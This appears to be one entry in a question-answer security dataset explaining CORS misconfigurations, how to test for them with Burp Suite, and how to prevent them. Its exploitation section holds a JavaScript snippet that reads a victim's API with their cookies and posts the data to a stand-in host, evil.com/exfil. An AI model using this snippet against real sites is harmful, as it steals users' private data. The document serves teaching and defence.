# CORS
# ═══════════════════════════════════════════════════════

add(
    "What is CORS misconfiguration and how do I exploit it?",
    "CORS (Cross-Origin Resource Sharing) misconfiguration occurs when a web application allows API access from unauthorized or untrusted origins. This is a key A01:2025 attack vector.\n\nHow CORS works:\n1. Browser enforces Same-Origin Policy (SOP) by default\n2. CORS headers relax SOP to allow cross-origin requests\n3. Server sets Access-Control-Allow-Origin header to permit specific origins\n4. Browser checks if requesting origin is allowed\n\nMISCONFIGURATION EXAMPLES:\n\n1. WILDCARD WITH CREDENTIALS:\n```http\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n- Any origin can make requests with credentials\n- Browsers usually block this, but some implementations don't\n\n2. REFLECTING ORIGIN:\n```http\nOrigin: https://evil.com\nAccess-Control-Allow-Origin: https://evil.com\nAccess-Control-Allow-Credentials: true\n```\n- Server reflects any Origin header\n- evil.com can access API with victim's cookies\n\n3. NULL ORIGIN:\n```http\nOrigin: null\nAccess-Control-Allow-Origin: null\nAccess-Control-Allow-Credentials: true\n```\n- null origin occurs in sandboxed iframes, local files\n- Attacker can exploit via data: URLs\n\n4. SUBDOMAIN BYPASS:\n```http\nAccess-Control-Allow-Origin: https://target.com\n```\n- If attacker controls evil.target.com, they can access API\n- Subdomain takeover amplifies this\n\nEXPLOITATION:\n```javascript\n// On attacker's site (evil.com)\nfetch('https://victim.com/api/user', {\n    credentials: 'include'  // Send cookies\n})\n.then(r => r.json())\n.then(data => {\n    // data contains victim's user info\n    fetch('https://evil.com/exfil', {\n        method: 'POST',\n        body: JSON.stringify(data)\n    });\n});\n```\n\nTESTING WITH BURP SUITE:\n1. Send request with Origin: https://evil.com\n2. Check if Access-Control-Allow-Origin reflects evil.com\n3. Check if Access-Control-Allow-Credentials: true\n4. If both true → exploitable CORS misconfiguration\n\nPREVENTION:\n1. NEVER USE WILDCARD WITH CREDENTIALS:\n```http\nAccess-Control-Allow-Origin: *  # Only if no credentials\n```\n\n2. WHITELIST SPECIFIC ORIGINS:\n```python\nALLOWED_ORIGINS = {'https://app.com', 'https://admin.app.com'}\n\n@app.after_request\ndef add_cors_headers(response):\n    origin = request.headers.get('Origin')\n    if origin in ALLOWED_ORIGINS:\n        response.headers['Access-Control-Allow-Origin'] = origin\n        response.headers['Access-Control-Allow-Credentials'] = 'true'\n    return response\n```\n\n3. DON'T REFLECT ORIGIN BLINDLY:\n- Validate Origin against allowlist\n- Don't just copy Origin header\n\n4. RESTRICT METHODS AND HEADERS:\n```http\nAccess-Control-Allow-Methods: GET, POST\nAccess-Control-Allow-Headers: Content-Type, Authorization\n```\n\n5. USE BACKEND-FOR-FRONTEND (BFF):\n- Frontend proxies API calls server-side\n- No CORS needed\n- Better security\n\n6. SET MAX-AGE:\n```http\nAccess-Control-Max-Age: 3600\n```\n- Reduces preflight requests\n- But not excessively long\n\nTOOLS: Burp Suite, CORScanner, corsy",
    "cors", "hard", "A01-CORS-101"
)

